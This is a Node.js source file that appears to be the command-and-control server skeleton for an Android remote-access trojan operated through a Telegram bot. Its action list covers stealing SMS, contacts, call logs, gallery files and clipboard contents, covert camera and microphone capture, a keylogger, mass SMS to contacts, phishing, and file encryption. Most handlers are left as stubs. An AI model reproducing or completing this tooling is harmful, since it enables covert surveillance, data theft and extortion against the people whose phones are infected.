const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Read and parse data.json file
const dataPath = './data.json';
let data;
try {
    data = JSON.parse(fs.readFileSync(dataPath, 'utf8'));
} catch (error) {
    console.error(`Error reading ${dataPath}:`, error);
    process.exit(1);
}

// Initialize Telegram bot
const bot = new TelegramBot(data.token, { polling: true });

// Map to hold application data
const appData = new Map();

// Define available actions
const actions = [
    '✯ SMS ✯',
    '✯ All Contacts ✯',
    '✯ Calls ✯',
    '✯ Apps ✯',
    '✯ Main Camera ✯',
    '✯ Selfie Camera ✯',
    '✯ Gallery ✯',
    '✯ File Explorer ✯',
    '✯ Microphone ✯',
    '✯ Play Audio ✯',
    '✯ Stop Audio ✯',
    '✯ Vibrate ✯',
    '✯ Toast ✯',
    '✯ Notification ✯',
    '✯ Clipboard ✯',
    '✯ Keylogger ON ✯',
    '✯ Keylogger OFF ✯',
    '✯ Open URL ✯',
    '✯ SMS to All Contacts ✯',
    '✯ Phishing ✯',
    '✯ Encrypt ✯',
    '✯ Decrypt ✯'
];

// Define other necessary endpoints and handlers here

server.listen(data.PORT, () => {
    console.log(`Server running on port ${data.PORT}`);
});

io.on('connection', (socket) => {
    console.log('New connection established');
    // Define other socket event handlers here
});

bot.on('message', (msg) => {
    // Define Telegram bot message handler here
    console.log('Received message:', msg);
});

// Ensure only one instance of the bot is running
const shutdown = () => {
    bot.stopPolling();
    server.close(() => {
        console.log('Server closed');
        process.exit(0);
    });
};

process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
